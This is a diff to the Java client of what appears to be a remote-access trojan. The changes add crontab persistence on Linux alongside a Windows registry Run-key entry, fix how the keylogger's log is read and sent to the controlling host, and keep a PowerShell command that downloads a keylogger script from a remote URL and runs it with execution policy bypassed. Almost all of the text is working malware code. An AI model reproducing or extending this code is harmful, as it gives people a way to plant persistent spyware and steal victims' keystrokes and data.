@@ -34,7 +34,7 @@ public class Client {
     private static DataOutputStream dos;
     private static File directory;
     private static DataInputStream dis;
-    private static boolean keyLogger = true;
+    private static boolean keyLogger = false;
     private static String aesKey = "";
 
     private static String keyLogFile = "";
@@ -101,7 +101,13 @@ public class Client {
     }
 
     private void createPersistence(String clientPath) {
-        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Desktop /d " + "\"" + clientPath + "\"");
+        // For linux, use crontab: "(crontab -l 2>/dev/null; echo "*/5 * * * * $(which java) -jar jarfile") | crontab -"
+        // For osx, use launchd:
+        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Desktop /d " + "\"" + clientPath + "\"");;
+        if (SYSTEMOS.toLowerCase().contains("lin")){
+            pb = new ProcessBuilder("(crontab", "-l", "2>/dev/null;", "echo \"*/5 * * * * $(which java) -jar jarfile\")", "|", "crontab", "-");
+        }
+
         try {
             Process proc = pb.start();
             proc.waitFor(2, TimeUnit.SECONDS);
@@ -122,18 +128,21 @@ public class Client {
                 System.out.println(" === Debug Mode: true");
                 System.out.println(" === Host: " + HOST + ":" + PORT);
                 System.out.println(" === Java version: " + JRE_VERSION);
+                System.out.println(" === Keylogger: " + keyLogger);
             }
 
             // Start the keylogger if requested
+            keyLogFile = "log.txt";
             if (keyLogger){
-                if (SYSTEMOS.contains("win")){
+                if (SYSTEMOS.toLowerCase().contains("win")){
                     // Download psh keylogger
                     String url = "https://gist.github.com/cbrnrd/7d84c7d979686e36c8e5691787042ac4/raw/3c8d76361c1d31d0375f00748a9af57d712c600c/keylog.ps1";
                     String fname = System.getProperty("java.io.tmpdir") + "\\" + randTextAlphaRestricted(8) + ".ps1";
-                    String cmd = "PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '.\\" + fname + "'); powershell.exe -ExecutionPolicy Bypass -file " + fname;
+                    String cmd = "PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + fname + "'); powershell.exe -ExecutionPolicy Bypass -file " + fname;
                     Runtime.getRuntime().exec(cmd);
-                    keyLogFile = System.getProperty("java.io.tmpdir") + "\\" + "log.txt";
                 }
+            } else {
+                Files.write(Paths.get("log.txt"), "No keys available".getBytes());
             }
 
             while (true) {
@@ -190,7 +199,7 @@ public class Client {
                      */
                     communicate("READKEYLOG");
                     String content = new String(Files.readAllBytes(Paths.get(keyLogFile)));
-                    communicate(content.length());
+                    dos.writeInt(content.length());
                     communicate(content);
                 } else if (input.contains("CLIPSET")) {
                     /*
@@ -544,6 +553,7 @@ public class Client {
                 debugMode = (Boolean.parseBoolean(settings[4]));
                 aesKey = settings[5];
                 keyLogger = (Boolean.parseBoolean(settings[6]));
+                System.out.println(settings[6]);
             }
         } catch (IOException e) {
             if (debugMode) {
